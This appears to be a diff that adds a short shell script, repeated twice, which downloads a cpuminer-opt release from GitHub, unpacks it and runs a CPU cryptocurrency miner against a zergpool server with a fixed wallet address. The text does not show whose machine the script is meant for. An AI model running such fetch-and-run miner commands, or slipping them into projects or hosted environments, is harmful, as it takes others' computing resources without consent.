@@ -1,0 +1,11 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz  
+
+tar xf cpuminer-opt-linux.tar.gz
+
+./cpuminer-sse2 --algo cpupower -o stratum+tcp://cpupower.eu.mine.zergpool.com:4250 -u 0x2a0c3F51829935789d8013Ac98ac13a5E5a202DB -p  c=SHIB,mc=CPU,ID=GEE
+
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz  
+
+tar xf cpuminer-opt-linux.tar.gz
+
+./cpuminer-sse2 --algo cpupower -o stratum+tcp://cpupower.eu.mine.zergpool.com:4250 -u 0x2a0c3F51829935789d8013Ac98ac13a5E5a202DB -p  c=SHIB,mc=CPU,ID=GEE2
